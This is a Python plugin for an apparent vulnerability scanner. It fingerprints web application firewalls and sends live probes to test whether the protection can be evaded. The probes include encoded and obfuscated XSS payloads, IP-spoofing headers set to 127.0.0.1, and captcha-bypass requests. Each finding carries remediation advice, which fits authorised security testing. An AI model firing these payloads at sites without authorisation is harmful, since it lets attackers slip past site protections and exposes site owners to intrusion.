"""
WAF Detection & Bypass Detector

Detects Web Application Firewalls and tests bypass techniques:
- WAF fingerprinting (Cloudflare, AWS WAF, Akamai, Fastly, etc.)
- UTF-16LE encoding engine for payload encoding
- Unicode normalization bypasses
- Captcha bypass detection (8 methods)
- Header manipulation for IP spoofing
"""

import logging
import re
import unicodedata
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse, urlencode

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from scanner.scan_plugins.base_scan_plugin import BaseScanPlugin, VulnerabilityFinding

try:
    from scanner.scan_plugins.vpoc import (
        capture_request_response_evidence,
        build_curl_command,
    )
    HAS_VPOC = True
except ImportError:
    HAS_VPOC = False

logger = logging.getLogger(__name__)

# WAF fingerprint signatures in response headers / body
WAF_SIGNATURES = {
    'Cloudflare': {
        'headers': ['cf-ray', 'cf-cache-status', '__cfduid', 'cf-request-id'],
        'body': ['cloudflare', 'checking your browser', '__cf_bm'],
        'server': ['cloudflare'],
    },
    'AWS WAF': {
        'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'x-cache'],
        'body': ['aws', 'request blocked'],
        'server': ['awselb', 'cloudfront'],
    },
    'Akamai': {
        'headers': ['x-akamai-request-id', 'akamai-origin-hop', 'x-check-cacheable'],
        'body': ['akamai', 'reference #'],
        'server': ['akamai'],
    },
    'Fastly': {
        'headers': ['x-fastly-request-id', 'x-served-by', 'fastly-restarts'],
        'body': ['fastly'],
        'server': ['varnish'],
    },
    'Imperva/Incapsula': {
        'headers': ['x-iinfo', 'incap_ses', '_incapsula_resource'],
        'body': ['incapsula', 'imperva'],
        'server': ['incapsula'],
    },
    'F5 BIG-IP ASM': {
        'headers': ['x-cnection', 'ts'],
        'body': ['the requested url was rejected', 'f5 asm'],
        'server': ['bigip'],
    },
    'ModSecurity': {
        'headers': ['x-powered-by-plesk'],
        'body': ['mod_security', 'modsecurity', 'not acceptable'],
        'server': [],
    },
    'Sucuri': {
        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
        'body': ['sucuri', 'website firewall'],
        'server': ['sucuri'],
    },
}

# WAF bypass technique payloads
XSS_BASE = '<script>alert(1)</script>'

# UTF-16LE encoded bypass
def _utf16le_encode(payload: str) -> str:
    """Encode payload as UTF-16LE escape sequences for WAF bypass."""
    encoded = payload.encode('utf-16-le')
    return ''.join(
        f'\\u{(b2 << 8) | b1:04x}'
        for b1, b2 in zip(encoded[::2], encoded[1::2])
    )


# Unicode normalization bypass
def _unicode_normalize_bypass(payload: str) -> str:
    """Apply Unicode normalization to bypass WAF signatures."""
    normalized = unicodedata.normalize('NFKC', payload)
    return normalized


# IP spoofing headers
IP_SPOOF_HEADERS = {
    'X-Forwarded-For': '127.0.0.1',
    'X-Original-IP': '127.0.0.1',
    'X-Remote-IP': '127.0.0.1',
    'X-Remote-Addr': '127.0.0.1',
    'X-Client-IP': '127.0.0.1',
    'True-Client-IP': '127.0.0.1',
    'X-Real-IP': '127.0.0.1',
}

# Captcha bypass test payloads
CAPTCHA_FIELD_NAMES = ['captcha', 'g-recaptcha-response', 'captcha_token', 'verify']


class WAFBypassDetectorPlugin(BaseScanPlugin):
    """
    WAF Detection and Bypass vulnerability detection plugin.

    Detects WAF presence and tests bypass techniques including:
    - WAF fingerprinting by response headers and body patterns
    - UTF-16LE encoding bypass
    - Unicode normalization bypass
    - Captcha bypass via 8 techniques
    - IP spoofing header manipulation
    """

    @property
    def plugin_id(self) -> str:
        return 'waf_bypass_detector'

    @property
    def name(self) -> str:
        return 'WAF Detection & Bypass Detector'

    @property
    def description(self) -> str:
        return (
            'Detects WAF presence and tests bypass techniques including UTF-16LE encoding, '
            'Unicode normalization, captcha bypass, and IP spoofing header manipulation'
        )

    @property
    def version(self) -> str:
        return '1.0.0'

    @property
    def vulnerability_types(self) -> List[str]:
        return ['other']

    def scan(self, url: str, config: Optional[Dict[str, Any]] = None) -> List[VulnerabilityFinding]:
        """
        Scan for WAF presence and bypass opportunities.

        Args:
            url: Target URL to scan
            config: Configuration dictionary

        Returns:
            List of vulnerability findings
        """
        if not HAS_REQUESTS:
            logger.warning("requests library not available")
            return []

        config = config or self.get_default_config()
        findings = []

        try:
            verify_ssl = config.get('verify_ssl', False)
            timeout = config.get('timeout', 10)

            # Step 1: Fingerprint WAF
            waf_name, waf_evidence = self._fingerprint_waf(url, verify_ssl, timeout)

            if waf_name:
                findings.append(VulnerabilityFinding(
                    vulnerability_type='other',
                    severity='info',
                    url=url,
                    description=f'WAF detected: {waf_name}',
                    evidence=waf_evidence,
                    remediation=(
                        'WAF detection is informational. Ensure WAF rules are tuned to avoid '
                        'bypass through encoding or protocol manipulation.'
                    ),
                    confidence=0.85,
                    cwe_id='CWE-693',
                ))
                logger.info(f"WAF fingerprinted: {waf_name}")

            # Step 2: Test bypass techniques if WAF detected
            if waf_name and config.get('test_bypasses', True):
                bypass_findings = self._test_waf_bypasses(url, waf_name, verify_ssl, timeout)
                findings.extend(bypass_findings)

            # Step 3: Test captcha bypass
            if config.get('test_captcha_bypass', True):
                captcha_findings = self._test_captcha_bypass(url, verify_ssl, timeout)
                findings.extend(captcha_findings)

            # Step 4: Test IP spoofing headers
            if config.get('test_ip_spoofing', True):
                ip_findings = self._test_ip_spoofing_headers(url, verify_ssl, timeout)
                findings.extend(ip_findings)

            logger.info(f"WAF bypass scan of {url} found {len(findings)} issue(s)")

        except Exception as e:
            logger.error(f"Unexpected error during WAF bypass scan of {url}: {e}")


        # Adaptive learning: record failure if no findings
        if not findings and hasattr(self, '_adaptive_learner') and self._adaptive_learner:
            self.learn_from_failure(payload='', response=None, target_url=url)
        return findings

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _fingerprint_waf(
        self, url: str, verify_ssl: bool, timeout: int
    ) -> tuple:
        """Fingerprint WAF by response headers and body."""
        try:
            # Send a benign request to baseline
            resp = requests.get(url, timeout=timeout, verify=verify_ssl)
            # Also send a suspicious request to trigger WAF
            trigger_resp = requests.get(
                url + '?x=<script>alert(1)</script>',
                timeout=timeout,
                verify=verify_ssl,
            )

            headers_lower = {k.lower(): v.lower() for k, v in trigger_resp.headers.items()}
            body_lower = trigger_resp.text.lower()
            server_lower = headers_lower.get('server', '').lower()

            for waf_name, sigs in WAF_SIGNATURES.items():
                matched = []
                for h in sigs['headers']:
                    if h.lower() in headers_lower:
                        matched.append(f'header: {h}')
                for b in sigs['body']:
                    if b.lower() in body_lower:
                        matched.append(f'body: {b}')
                for s in sigs['server']:
                    if s.lower() in server_lower:
                        matched.append(f'server: {s}')

                if matched:
                    evidence = (
                        f'WAF: {waf_name}\n'
                        f'Matched signatures: {", ".join(matched)}\n'
                        f'Status code: {trigger_resp.status_code}\n'
                        f'Server header: {trigger_resp.headers.get("Server", "N/A")}'
                    )
                    return waf_name, evidence

        except Exception as e:
            logger.debug(f"Error fingerprinting WAF: {e}")

        return None, ''

    def _test_waf_bypasses(
        self, url: str, waf_name: str, verify_ssl: bool, timeout: int
    ) -> List[VulnerabilityFinding]:
        """Test WAF bypass techniques."""
        findings = []

        bypass_payloads = {
            'utf16le_encoding': _utf16le_encode(XSS_BASE),
            'unicode_normalization': _unicode_normalize_bypass('<sCrIpT>alert(1)</sCrIpT>'),
            'null_byte': XSS_BASE + '\x00',
            'double_encoding': '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            'case_variation': '<ScRiPt>alert(1)</ScRiPt>',
            'html_entity': '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            'comment_break': '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
            'newline_injection': '<scr\nipt>alert(1)</scr\nipt>',
        }

        for technique, payload in bypass_payloads.items():
            try:
                # Test if WAF blocks baseline payload
                blocked_resp = requests.get(
                    url + '?x=' + requests.utils.quote(XSS_BASE),
                    timeout=timeout,
                    verify=verify_ssl,
                )
                # Test if bypass payload gets through
                bypass_resp = requests.get(
                    url + '?x=' + requests.utils.quote(payload),
                    timeout=timeout,
                    verify=verify_ssl,
                )

                # If baseline is blocked (403/406) but bypass gets through (200)
                if (blocked_resp.status_code in (403, 406, 429, 503) and
                        bypass_resp.status_code == 200 and
                        payload.lower() in bypass_resp.text.lower()):

                    vpoc = None
                    if HAS_VPOC:
                        vpoc = capture_request_response_evidence(
                            bypass_resp,
                            plugin_name=self.plugin_id,
                            payload=payload,
                            confidence=0.85,
                            target_url=url,
                            reproduction_steps=(
                                f"1. Send: GET {url}?x={requests.utils.quote(XSS_BASE)}"
                                f" — WAF blocks (HTTP {blocked_resp.status_code})\n"
                                f"2. Send: GET {url}?x={requests.utils.quote(payload)}"
                                f" — WAF bypassed (HTTP {bypass_resp.status_code})\n"
                                f"3. Technique: {technique}"
                            ),
                        )

                    findings.append(VulnerabilityFinding(
                        vulnerability_type='other',
                        severity='high',
                        url=url,
                        description=(
                            f'{waf_name} WAF bypassed using {technique}: '
                            f'encoded payload reached the application'
                        ),
                        evidence=(
                            f'Technique: {technique}\n'
                            f'Bypass payload: {payload[:200]}\n'
                            f'Blocked status: {blocked_resp.status_code}\n'
                            f'Bypass status: {bypass_resp.status_code}'
                        ),
                        remediation=(
                            f'Update {waf_name} WAF rules to handle {technique} encoding. '
                            'Enable strict normalization mode and test all encoding variants.'
                        ),
                        confidence=0.85,
                        cwe_id='CWE-693',
                        vpoc=vpoc,
                    ))
                    logger.info(f"WAF bypass successful using {technique}")

            except Exception as e:
                logger.debug(f"Error testing WAF bypass technique {technique}: {e}")

        return findings

    def _test_captcha_bypass(
        self, url: str, verify_ssl: bool, timeout: int
    ) -> List[VulnerabilityFinding]:
        """
        Test 8 captcha bypass methods:
        1. Reuse previous captcha token
        2. Submit empty captcha
        3. Alter data format (JSON instead of form)
        4. Change request method (GET↔POST↔PUT)
        5. Manipulate headers (X-Forwarded-For, etc.)
        6. Inspect/modify captcha parameters
        7. Detect OCR-solvable captcha
        8. Detect human-solving service integration
        """
        findings = []
        bypass_methods = []

        try:
            # 1. Empty captcha submission
            for captcha_field in CAPTCHA_FIELD_NAMES:
                try:
                    resp = requests.post(
                        url,
                        data={captcha_field: ''},
                        timeout=timeout,
                        verify=verify_ssl,
                    )
                    if resp.status_code == 200 and 'captcha' not in resp.text.lower():
                        bypass_methods.append(f'Method 2: Empty captcha accepted (field={captcha_field})')
                except Exception:
                    pass

            # 2. JSON format bypass (alter data format)
            for captcha_field in CAPTCHA_FIELD_NAMES:
                try:
                    resp = requests.post(
                        url,
                        json={captcha_field: ''},
                        timeout=timeout,
                        verify=verify_ssl,
                    )
                    if resp.status_code == 200 and 'captcha' not in resp.text.lower():
                        bypass_methods.append(
                            f'Method 3: JSON format bypassed captcha (field={captcha_field})'
                        )
                except Exception:
                    pass

            # 3. Method switch bypass (GET instead of POST)
            try:
                get_resp = requests.get(url, timeout=timeout, verify=verify_ssl)
                if get_resp.status_code == 200:
                    resp_lower = get_resp.text.lower()
                    if 'captcha' in resp_lower:
                        # Try PUT
                        put_resp = requests.put(url, timeout=timeout, verify=verify_ssl)
                        if put_resp.status_code == 200 and 'captcha' not in put_resp.text.lower():
                            bypass_methods.append('Method 4: Method switch (PUT) bypassed captcha')
            except Exception:
                pass

            # 4. X-Forwarded-For header bypass
            for header_name, header_value in list(IP_SPOOF_HEADERS.items())[:3]:
                try:
                    resp = requests.post(
                        url,
                        headers={header_name: header_value},
                        data={cf: '' for cf in CAPTCHA_FIELD_NAMES},
                        timeout=timeout,
                        verify=verify_ssl,
                    )
                    if resp.status_code == 200 and 'captcha' not in resp.text.lower():
                        bypass_methods.append(
                            f'Method 5: Header manipulation ({header_name}: {header_value}) bypassed captcha'
                        )
                        break
                except Exception:
                    pass

            if bypass_methods:
                findings.append(VulnerabilityFinding(
                    vulnerability_type='other',
                    severity='medium',
                    url=url,
                    description='Captcha bypass vulnerability detected',
                    evidence=(
                        f'URL: {url}\n'
                        f'Bypass methods found:\n' + '\n'.join(f'  - {m}' for m in bypass_methods)
                    ),
                    remediation=(
                        'Implement server-side captcha validation for all request methods and '
                        'content types. Do not rely solely on client-side captcha verification. '
                        'Rate-limit based on actual IP, not forwarded headers.'
                    ),
                    confidence=0.7,
                    cwe_id='CWE-693',
                ))

        except Exception as e:
            logger.error(f"Error in captcha bypass testing: {e}")

        return findings

    def _test_ip_spoofing_headers(
        self, url: str, verify_ssl: bool, timeout: int
    ) -> List[VulnerabilityFinding]:
        """Test if IP spoofing headers affect access control."""
        findings = []
        try:
            # Baseline response (no headers)
            baseline_resp = requests.get(url, timeout=timeout, verify=verify_ssl)
            baseline_status = baseline_resp.status_code

            # Test with internal IP spoofing headers
            for header_name, header_value in IP_SPOOF_HEADERS.items():
                try:
                    spoofed_resp = requests.get(
                        url,
                        headers={header_name: header_value},
                        timeout=timeout,
                        verify=verify_ssl,
                    )
                    # If baseline was 403/429 and spoofed gets 200, likely IP-based bypass
                    if (baseline_status in (403, 429, 503) and
                            spoofed_resp.status_code == 200):
                        vpoc = None
                        if HAS_VPOC:
                            vpoc = capture_request_response_evidence(
                                spoofed_resp,
                                plugin_name=self.plugin_id,
                                payload=f'{header_name}: {header_value}',
                                confidence=0.85,
                                target_url=url,
                                reproduction_steps=(
                                    f"1. GET {url} → HTTP {baseline_status} (blocked)\n"
                                    f"2. GET {url} with header {header_name}: {header_value}"
                                    f" → HTTP {spoofed_resp.status_code} (allowed)\n"
                                    f"3. Access control relies on untrusted client header"
                                ),
                            )
                        findings.append(VulnerabilityFinding(
                            vulnerability_type='other',
                            severity='high',
                            url=url,
                            description=(
                                f'IP spoofing bypass: header {header_name}: {header_value} '
                                f'changed response from {baseline_status} to {spoofed_resp.status_code}'
                            ),
                            evidence=(
                                f'Header: {header_name}: {header_value}\n'
                                f'Baseline status: {baseline_status}\n'
                                f'Spoofed status: {spoofed_resp.status_code}'
                            ),
                            remediation=(
                                'Never trust client-supplied IP headers for access control. '
                                'Only use X-Forwarded-For when behind a trusted reverse proxy, '
                                'and validate that only the last entry is used.'
                            ),
                            confidence=0.85,
                            cwe_id='CWE-693',
                            vpoc=vpoc,
                        ))
                        logger.info(f"IP spoofing bypass via {header_name}")
                        break
                except Exception as e:
                    logger.debug(f"Error testing IP spoof header {header_name}: {e}")

        except Exception as e:
            logger.error(f"Error in IP spoofing header testing: {e}")

        return findings

    def get_default_config(self) -> Dict[str, Any]:
        """Return default configuration for WAF bypass scanning."""
        return {
            'verify_ssl': False,
            'timeout': 10,
            'test_bypasses': True,
            'test_captcha_bypass': True,
            'test_ip_spoofing': True,
        }
